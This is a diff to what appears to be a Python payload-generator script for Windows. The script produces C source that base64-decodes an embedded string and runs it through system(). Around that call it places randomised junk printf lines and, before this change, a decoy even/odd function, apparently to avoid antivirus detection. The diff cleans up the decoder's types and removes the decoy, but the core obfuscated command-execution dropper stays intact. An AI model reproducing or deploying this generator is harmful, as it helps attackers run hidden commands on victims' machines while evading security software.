@@ -10,9 +10,9 @@ payload_generate = junk.junk_code + '''
 #include <stdlib.h>
 #include <winsock2.h>
 #include <windows.h>
+#include <string.h>
 
 typedef unsigned char ubyte;
-const ubyte BASE64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  
 int findIndex(const ubyte val) {
     if ('A' <= val && val <= 'Z') {
@@ -33,10 +33,10 @@ int findIndex(const ubyte val) {
     return -1;
 }
  
-int decode(const ubyte source[], ubyte sink[]) {
+int decode(const char source[], char sink[]) {
     const size_t length = strlen(source);
-    const ubyte *it = source;
-    const ubyte *end = source + length;
+    const char *it = source;
+    const char *end = source + length;
     int acc;
  
     if (length % 4 != 0) {
@@ -77,42 +77,26 @@ int decode(const ubyte source[], ubyte sink[]) {
     return 0;
 }
 
-void ''' + str("".join(choice(words) for x in range(randint(5, 7)))) + '''() {
-
-    int ''' + string_rem + ''';
-    printf("Enter something: ");
-    scanf("%d", &''' + string_rem + ''');
-
-    if(''' + string_rem + ''' % 2 == 0)
-        printf("%d is even.", ''' + string_rem + ''');
-    else
-        printf("%d is odd.", ''' + string_rem + ''');
-
-}
-
-
-
 int main(int argc, char *argv[])
 {
 
-printf("''' + str("".join(choice(words) for x in range(randint(7, 13)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(4, 10)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(3, 25)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(8, 50)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(12, 100)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(7, 13)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(4, 10)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(3, 25)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(8, 50)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(12, 100)))) + '''");
 
-char cmd[50000];
-   ubyte data[] = "cakeisgoodiguess999";
-   ubyte decoded[1024];
-   decode(data, cmd);
+    char cmd[50000];
+    char data[] = "cakeisgoodiguess999";
+    decode(data, cmd);
 
-system(cmd);
+    system(cmd);
 
-printf("''' + str("".join(choice(words) for x in range(randint(7, 13)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(4, 10)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(3, 25)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(8, 50)))) + '''");
-printf("''' + str("".join(choice(words) for x in range(randint(12, 100)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(7, 13)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(4, 10)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(3, 25)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(8, 50)))) + '''");
+    printf("''' + str("".join(choice(words) for x in range(randint(12, 100)))) + '''");
 
 
 
